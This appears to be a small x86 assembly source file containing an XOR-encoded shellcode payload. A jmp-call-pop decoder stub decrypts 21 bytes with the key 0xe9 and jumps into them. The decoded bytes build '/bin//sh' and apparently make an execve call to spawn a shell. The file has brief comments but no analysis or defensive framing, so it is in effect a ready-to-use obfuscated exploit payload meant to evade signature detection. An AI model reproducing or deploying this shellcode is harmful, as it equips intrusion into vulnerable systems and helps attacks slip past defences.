; section .data
; 	string db '/bin//sh'
; section .text
global _start
	; this shell code will xor every byte of 'jocker' segment , then execute them
	; password is 0xe9
	_start:
		jmp jocker
		loader:
			pop esi ; get address of encrypted shellcode	
			xor ecx, ecx
			mov cl, 21 ; loop times (length of encrypt shellcode)
			decrypt:
				mov al, [esi]
				xor al, 0e9H
				mov [esi], al
				inc esi
				loop decrypt
				jmp encrypt

	jocker:
		call loader
	encrypt:
		db 0d8H
		db 20H
		db 0b8H
		db 81H
		db 0c6H
		db 0c6H
		db 9aH
		db 81H
		db 81H
		db 0c6H
		db 8bH
		db 80H
		db 87H
		db 60H
		db 0aH
		db 83H
		db 0e2H
		db 0b1H
		db 70H
		db 24H
		db 69H
